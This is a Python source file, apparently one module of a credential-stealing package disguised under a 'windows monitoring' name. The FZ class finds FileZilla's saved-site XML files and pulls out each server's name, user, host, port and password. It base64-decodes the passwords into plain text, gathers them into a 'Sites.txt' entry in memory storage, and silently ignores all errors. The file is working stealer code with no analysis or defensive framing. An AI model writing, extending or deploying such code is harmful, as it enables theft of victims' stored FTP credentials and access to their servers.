from os import listdir, path
from base64 import b64decode
from xml.etree import ElementTree

from watchitoring.windowsmonitoring.helpers import MemoryStorage
from watchitoring.windowsmonitoring.helpers.config import FZConfig
from watchitoring.windowsmonitoring.helpers.dataclasses import Data


class FZ:
    def __init__(self, folder: str):

        self.__file = path.join(folder, "Sites.txt")
        self.__config = FZConfig()
        self.__storage = MemoryStorage()

    def __get_hosts(self) -> None:
        """
        Collects all FZ hosts.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not path.exists(self.__config.SitesPath):
            return

        files = listdir(self.__config.SitesPath)
        data_files = self.__config.DataFiles

        if not any(file in data_files for file in files):
            return

        temp = []

        for file in data_files:
            try:

                root = ElementTree.parse(path.join(self.__config.SitesPath, file)).getroot()
                data = self.__config.FZData

                if not root:
                    continue

                for server in root[0].findall("Server"):

                    site_name = server.find("Name").text if hasattr(server.find("Name"), "text") else ""
                    site_user = server.find("User").text if hasattr(server.find("User"), "text") else ""
                    site_pass = server.find("Pass").text if hasattr(server.find("Pass"), "text") else ""
                    site_host = server.find("Host").text if hasattr(server.find("Host"), "text") else ""
                    site_port = server.find("Port").text if hasattr(server.find("Port"), "text") else ""
                    site_pass = b64decode(site_pass).decode("utf-8")

                    temp.append(data.format(site_name, site_user, site_pass, site_host, site_port))

            except Exception as e:
                pass

        self.__storage.add_from_memory(
            self.__file,
            "".join(item for item in temp)
        )

        self.__storage.add_data("Application", "FZ")

    def run(self) -> Data:
        """
        Launches the FZ hosts collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_hosts()

            return self.__storage.get_data()

        except Exception as e:
            pass
